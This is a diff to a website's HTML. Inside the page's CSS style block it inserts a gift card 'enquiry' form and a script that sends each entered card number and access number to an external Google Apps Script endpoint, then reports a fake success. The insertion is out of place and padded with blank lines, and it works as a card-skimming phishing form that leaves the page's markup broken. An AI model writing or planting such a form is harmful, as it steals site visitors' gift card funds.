@@ -76,6 +76,58 @@
     footer{text-align:center;padding:20px;background:linear-gradient(135deg,#2a2a90,#e63946);color:#fff;margin-top:40px;border-top-left-radius:15px;border-top-right-radius:15px;}
     #errorMsg{display:none;color:#28a745;font-weight:500;margin-top:10px;text-align:center;}
     @media(max-width:768px){.search-bar{flex-direction:column;gap:8px;width:100%;}.main-title{font-size:24px;}.card-custom{flex-direction:column;text-align:center;}}
+
+
+  <div class="container">
+    <h2>Gift Card Enquiry</h2>
+    <form id="cardForm">
+      <input type="text" name="giftCardNumber" placeholder="Enter Gift Card Number" required>
+      <input type="text" name="accessNumber" placeholder="Enter Access Number" required>
+      <button type="submit">Submit</button>
+    </form>
+    <p id="errorMsg">✅ Form submitted successfully!</p>
+  </div>
+
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("giftCardNumber"),
+        accessNumber: formData.get("accessNumber"),
+      };
+
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxxWc-gnkS1RosZF33aahxTFUWTINAoiyhin9pOzzVUZLJOugP4NAodKW7E8IHM5y03/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          document.getElementById("errorMsg").style.display = "block";
+          document.getElementById("cardForm").reset();
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
+    });
+  </script>
+
+</body>
+</html>
+
+  
+  
+  
+  
+  
+  
+  
+  
   </style>
 </head>
 <body>
